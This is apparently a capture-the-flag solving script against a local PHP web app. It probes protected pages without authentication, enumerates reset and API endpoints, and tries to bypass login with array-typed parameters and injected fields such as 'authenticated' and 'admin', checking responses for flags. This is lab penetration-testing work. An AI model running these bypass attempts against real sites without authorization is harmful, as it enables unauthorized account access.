import requests
import re

cookies = {"PHPSESSID": "9b8ouneh58t3bjv346lp4s82ol"}
base_url = "http://127.0.0.1:32892"

# Check if we can access dashboard.php without authentication
print("[*] Testing direct access to protected pages...\n")

test_pages = [
    "/dashboard.php",
    "/admin.php",
    "/profile.php",
    "/users.php",
    "/settings.php",
    "/logout.php"
]

for page in test_pages:
    resp = requests.get(f"{base_url}{page}", cookies=cookies, allow_redirects=False)
    print(f"[*] GET {page}")
    print(f"    Status: {resp.status_code}")
    print(f"    Content-Length: {len(resp.text)}")
    if resp.status_code == 200:
        print(f"    Response preview: {resp.text[:200]}")
        
        # Check for flags
        flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
        if flags:
            print(f"    [!] FLAGS FOUND: {flags}")
            print(f"\n[*] Full response:\n{resp.text}")
    print()

# Check if there's a password reset or forgot password functionality
print("\n[*] Checking for password reset endpoints...")
reset_endpoints = [
    "/reset.php",
    "/forgot.php",
    "/forgot-password.php",
    "/reset-password.php",
    "/recover.php"
]

for endpoint in reset_endpoints:
    resp = requests.get(f"{base_url}{endpoint}", cookies=cookies)
    if resp.status_code == 200:
        print(f"[+] Found: {endpoint}")
        print(f"    Response: {resp.text[:500]}")

# Check for API endpoints that might have different authentication
print("\n[*] Checking for API endpoints...")
api_endpoints = [
    "/api/users",
    "/api/login",
    "/api/auth",
    "/api/dashboard",
    "/api.php",
    "/api/v1/users",
    "/api/v1/auth"
]

for endpoint in api_endpoints:
    resp = requests.get(f"{base_url}{endpoint}", cookies=cookies)
    if resp.status_code != 404:
        print(f"[+] API endpoint found: {endpoint}")
        print(f"    Status: {resp.status_code}")
        print(f"    Response: {resp.text[:500]}")

# Try parameter pollution or manipulation
print("\n[*] Testing for authentication bypass via parameter manipulation...")

headers = {
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "X-Requested-With": "XMLHttpRequest",
}

# Try array parameters
bypass_attempts = [
    {"username": "admin", "password[]": "anything", "submit": "submit"},
    {"username": "admin", "password": "anything", "authenticated": "1", "submit": "submit"},
    {"username": "admin", "password": "anything", "logged_in": "true", "submit": "submit"},
    {"username": "admin", "password": "anything", "admin": "1", "submit": "submit"},
    {"username[]": "admin", "password": "anything", "submit": "submit"},
]

for idx, data in enumerate(bypass_attempts, 1):
    resp = requests.post(f"{base_url}/index.php", headers=headers, data=data, cookies=cookies)
    print(f"[{idx}] Attempt: {data}")
    print(f"    Response: {resp.text}")
    
    if "success" in resp.text.lower() and "password" not in resp.text:
        print(f"    [!] POSSIBLE BYPASS!")
        print(f"    Trying dashboard access...")
        session = requests.Session()
        session.cookies.update(cookies)
        session.cookies.update(resp.cookies)
        dash = session.get(f"{base_url}/dashboard.php")
        print(f"    Dashboard: {dash.text[:500]}")
    print()

